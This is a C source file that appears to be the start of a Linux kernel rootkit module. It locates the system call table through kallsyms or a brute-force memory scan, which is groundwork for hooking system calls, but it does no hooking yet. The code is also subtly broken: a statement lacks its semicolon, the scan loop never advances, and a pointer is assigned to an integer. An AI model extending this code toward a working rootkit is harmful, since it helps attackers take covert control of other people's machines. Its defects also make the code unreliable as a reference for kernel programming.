#include "rootkit.h"

void rootkit_exit(void) {

}

int rootkit_init(void) {
  int retval;

  /* load the parameters */
  ///* locate the syscall table */

  retval = locate_sys_call_table();
  if (retval == EFAULT)
    return retval;
  printk("We found the sys call table at %p\n", sys_call_table_addr);
  return 0;
}

/**
 * Finds a system call table. This should be done during compile time
 * if CONFIG_KALLSYMS is defined, we can use kallsyms_lookup_name
 * otherwise, we have to find the find the table ourselves
 * 
 * @return 0 if success, EFAULT if failure
 */
int locate_sys_call_table(void) {
#ifndef CONFIG_KALLSYMS
  addr_size i = START_ADDRESS;
  addr_size **sctable; 
#endif

#if CONFIG_KALLSYMS
  /* kernel symbols are accessible */
  printk("CONFIG_KALLSYMS is enabled!");
  unsigned long tmp = (unsigned long**) kallsyms_lookup_name("sys_call_table");
  printk("kallsyms says the sys_call_table is at %p\n", tmp)
  sys_call_table_addr = (addr_size *) kallsyms_lookup_name("sys_call_table");



#else
  /* iteratively detect for the system call table */
  printk("CONFIG_KALLSYMS is disabled!");
  while(i < END_ADDRESS){
    sctable = (addr_size **) i;
    if(sctable[__NR_close] == (addr_size *) sys_close){
      sys_call_table_addr = &sctable[0];
      break;
    }
    sys_call_table_addr = 0;
  }
#endif
  /* check for failure*/
  if (sys_call_table_addr == 0)
    return EFAULT;
  return 0;
}

